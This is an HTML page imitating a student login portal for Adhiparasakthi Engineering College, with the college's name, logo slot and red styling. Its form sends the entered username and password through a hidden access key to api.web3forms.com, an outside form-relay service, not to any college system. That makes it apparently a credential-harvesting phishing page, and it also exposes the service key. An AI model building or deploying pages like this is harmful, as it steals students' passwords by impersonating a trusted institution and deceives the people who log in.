<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adhiparasakthi Engineering College Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#5b0000,#b30000);
}

.container{
    width:370px;
    background:#fff;
    border-radius:15px;
    padding:30px;
    box-shadow:0 10px 30px rgba(0,0,0,.4);
    text-align:center;
}

.logo{
    width:160px;
    margin-bottom:10px;
}

h2{
    color:#8B0000;
    margin-bottom:5px;
}

p{
    color:#666;
    margin-bottom:20px;
    font-size:14px;
}

.input-box{
    width:100%;
    padding:14px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:15px;
    outline:none;
}

.input-box:focus{
    border:1px solid #b30000;
    box-shadow:0 0 5px rgba(179,0,0,.3);
}

button{
    width:100%;
    padding:14px;
    margin-top:15px;
    background:#b30000;
    color:#fff;
    border:none;
    border-radius:8px;
    font-size:17px;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    background:#8B0000;
}

.footer{
    margin-top:20px;
    font-size:12px;
    color:#888;
}
</style>

</head>
<body>

<div class="container">

    <!-- Logo -->
    <img src="images-removebg-preview.png" class="logo" alt="College Logo">

    <h2>Sakthi Engineering College</h2>

    <p>Student Login Portal</p>

    <form action="https://api.web3forms.com/submit" method="POST">

        <!-- Your Web3Forms Access Key -->
        <input type="hidden" name="access_key" value="e760c71f-11f7-4964-99ff-eac4fffa4fad">

        <!-- Optional -->
        <input type="hidden" name="subject" value="Student Login Submission">

        <input
            class="input-box"
            type="text"
            name="username"
            placeholder="Username / Email"
            required>

        <input
            class="input-box"
            type="password"
            name="password"
            placeholder="Password"
            required>

        <button type="submit">
            Login
        </button>

    </form>

    <div class="footer">
        © Adhiparasakthi Engineering College
    </div>

</div>

</body>
</html>
